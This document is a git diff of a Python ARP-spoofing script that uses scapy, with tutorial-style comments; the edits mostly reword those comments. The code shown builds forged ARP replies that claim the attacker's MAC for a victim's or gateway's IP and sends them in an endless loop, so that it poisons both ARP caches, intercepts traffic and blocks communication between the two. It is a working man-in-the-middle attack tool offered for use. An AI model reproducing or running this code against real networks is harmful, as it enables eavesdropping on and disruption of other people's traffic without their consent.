@@ -52,11 +52,12 @@ def get_mac(ip):
 # telling the target that we are the default gateway
 # telling the gateway that we are the target
 def spoof(interface, target_ip, spoofed_ip):
-    # First we will send an ARP request to the target IP to know its MAC address:
+    # First we will send an ARP request to the target IP [the one that we need to fool (victim/gateway)]
+    # to know its MAC address:
     target_mac = get_mac(target_ip)
-    # Now we need to create an ARP response to send it to the target or the gateway
-    # telling the target that we are the default gateway
-    # telling the gateway that we are the target
+    # Now we need to create an ARP response to send it to the victim or the gateway
+    # if to victim : telling the victim that we are the default gateway
+    # if to gateway: telling the gateway that we are the victim
     # To achieve that we will first create an object of ARP Class to be a response
     response = scapy.ARP()
     # Now it is by default a request packet
@@ -64,18 +65,18 @@ def spoof(interface, target_ip, spoofed_ip):
     # You also can see all the fields of the ARP Class by :
     # scapy.ls(scapy.ARP)
     response.op = 2
-    # We need also to set the target's IP as destination IP :
+    # We need also to set the target's [the one that we need to fool (victim/gateway)] IP as destination IP :
     response.pdst = target_ip
-    # We need also to ser the target's MAC as destinationMAC:
+    # We need also to ser the target's [the one that we need to fool (victim/gateway)] MAC as destinationMAC:
     response.hwdst = target_mac
     # Now we will set the source IP that the response should be from,
-    # but this will be the lie , as we will set it as the routers IP:
+    # but this will be the lie , as we will set it as the spoofed IP:
     response.psrc = spoofed_ip
     # We should also specify the src MAC to our Mac Address, but by default it is set to our MAC
-    # As we are the senders of this packet .
+    # As we are the senders of this packet.
     # Now we can see the packet :
     # response_for_target.show()
-    # print(response_for_target.summary()) "ARP is at `ourMAC` says `spoofed_ip`
+    # print(response_for_target.summary()) "ARP is at `our MAC` says `spoofed_ip`
     # Sending the packet in infinite loop to continuously fooling them
     # and blocking the communication between them :
     number_of_packets = 0
@@ -84,7 +85,7 @@ def spoof(interface, target_ip, spoofed_ip):
         scapy.send(response, iface=interface, verbose=False)
         time.sleep(2)
         number_of_packets += 2
-        print("\r[+]", str(number_of_packets), "Spoofing Packets Sent", end="")
+        print("\r[+] Packets Sent: " + str(number_of_packets), end="")
 
 
 # This function will fix both the spoofed arp tables in the victims device and the router
@@ -128,3 +129,4 @@ def main():
 
 if __name__ == '__main__':
     main()
+
